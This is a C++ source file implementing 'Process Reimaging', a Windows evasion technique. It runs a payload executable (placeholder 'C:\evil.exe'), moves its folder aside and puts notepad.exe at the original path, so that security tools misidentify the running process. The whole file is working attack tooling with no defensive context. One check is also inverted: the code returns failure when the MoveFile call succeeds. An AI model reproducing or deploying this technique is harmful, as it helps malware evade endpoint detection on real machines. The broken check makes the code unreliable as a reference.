/*
Title: Process Reimaging
Resources:
	- https://github.com/djhohnstein/ProcessReimaging
*/

#include <Windows.h>
#include <stdio.h>
#include <string>

BOOL SplitDirAndFileName(const std::wstring wFullPath, std::wstring& wDir, std::wstring& wFileName) {
	SIZE_T dwLastSlashPos = wFullPath.find_last_of(L"/\\");
	if (dwLastSlashPos == std::wstring::npos) {
		return FALSE;
	}

	wDir = wFullPath.substr(0, dwLastSlashPos);
	wFileName = wFullPath.substr(dwLastSlashPos + 1);

	return TRUE;
}

BOOL ProcessReimaging() {
	std::wstring wBadPath = L"C:\\evil.exe"; // Replace it with a payload executable file path.
	std::wstring wGoodPath = L"C:\\Windows\\System32\\notepad.exe"; // Replace it with a legitimate executable file path.

	// Get full path of this process.
	WCHAR selfFullPath[MAX_PATH];
	if (!GetModuleFileName(nullptr, selfFullPath, MAX_PATH)) {
		return FALSE;
	}
	std::wstring wSelfFullPath(selfFullPath);

	// Split to the directory path and filename for this executable and the payload path.
	std::wstring wSelfDir;
	std::wstring wSelfFileName;
	if (!SplitDirAndFileName(wSelfFullPath, wSelfDir, wSelfFileName)) {
		return FALSE;
	}
	std::wstring wBadDir;
	std::wstring wBadFileName;
	if (!SplitDirAndFileName(wBadPath, wBadDir, wBadFileName)) {
		return FALSE;
	}
	
	// Create the output directory.
	std::wstring wExecutePath = wSelfDir + L"\\execute";
	std::wstring wHiddenPath = wSelfDir + L"\\hidden";
	if (!CreateDirectory(wExecutePath.c_str(), nullptr)) {
		return FALSE;
	}

	// Copy the payload file to the execute path.
	std::wstring wExecuteFullPath = wExecutePath + L"\\phase1.exe";
	if (!CopyFile(wBadPath.c_str(), wExecuteFullPath.c_str(), FALSE)) {
		return FALSE;
	}

	// Create a process
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	if (!CreateProcess(nullptr, (LPWSTR)wExecuteFullPath.c_str(), nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi)) {
		return FALSE;
	}

	// Move the execute directory to the hidden directory.
	if (MoveFile(wExecutePath.c_str(), wHiddenPath.c_str())) {
		return FALSE;
	}

	// Put the good executable file into the execute directory.
	if (!CreateDirectory(wExecutePath.c_str(), nullptr)) {
		return FALSE;
	}
	if (!CopyFile(wGoodPath.c_str(), wExecuteFullPath.c_str(), TRUE)) {
		return FALSE;
	}

	return TRUE;
}
